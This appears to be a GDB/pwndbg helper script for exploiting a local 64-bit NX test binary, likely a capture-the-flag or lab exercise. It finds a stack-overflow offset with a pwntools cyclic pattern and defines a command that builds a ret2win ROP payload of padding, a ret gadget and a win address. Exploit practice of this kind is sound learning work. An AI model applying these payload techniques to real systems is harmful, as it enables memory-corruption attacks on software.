set pagination off
set confirm off
file tests/bins/t6_64bit_nx

# ── find offset ─────────────────────────────────────────────
define bs_find_offset
  set $pat_size = 164
  run <<< $(python3 -c 'from pwn import cyclic; import sys; sys.stdout.buffer.write(cyclic(164))')
  info registers rip
  python
from pwn import cyclic_find
v = gdb.parse_and_eval('$rip')
off = cyclic_find(int(v) & 0xffffffff)
print('cyclic_find offset:', off)
  end
end

# ── win function ─────────────────────────────────────────────
break *0x401156

# breakpoints on interesting functions (uncomment to enable):
# break deregister_tm_clones
# break register_tm_clones
# break completed.0
# break frame_dummy
# break data_start
# break process

# ── stack helpers ────────────────────────────────────────────
define bs_stack
  x/32gx $rsp
end
define bs_regs
  info registers
end

define bs_exploit
  python
from pwn import *
context.arch = 'amd64'
e   = ELF('tests/bins/t6_64bit_nx', checksec=False)
rop = ROP(e)
win = e.symbols.get('win', 0x401156)
g   = rop.find_gadget(['ret'])
ret_g = g[0] if g else 0
payload = b'A'*100 + p64(ret_g) + p64(win) if win else b'A'*108
print('Payload (' + str(len(payload)) + 'B):', payload.hex())
  end
end

# pwndbg tips:
# telescope $rsp 20   — annotated stack view
# checksec            — binary protections
# rop                 — ROP gadget search
# heap                — heap chunk view
# got                 — GOT table
